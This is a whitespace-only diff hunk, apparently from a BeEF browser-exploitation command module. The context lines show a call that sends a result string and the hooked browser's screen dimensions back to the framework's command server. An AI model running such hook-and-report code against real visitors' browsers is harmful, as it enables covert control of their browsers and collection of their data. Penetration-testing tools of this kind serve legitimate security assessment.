@@ -61,4 +61,3 @@ beef.execute(function() {
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+result+"&w="+screen.width+"&h="+screen.height);
 
 });
-
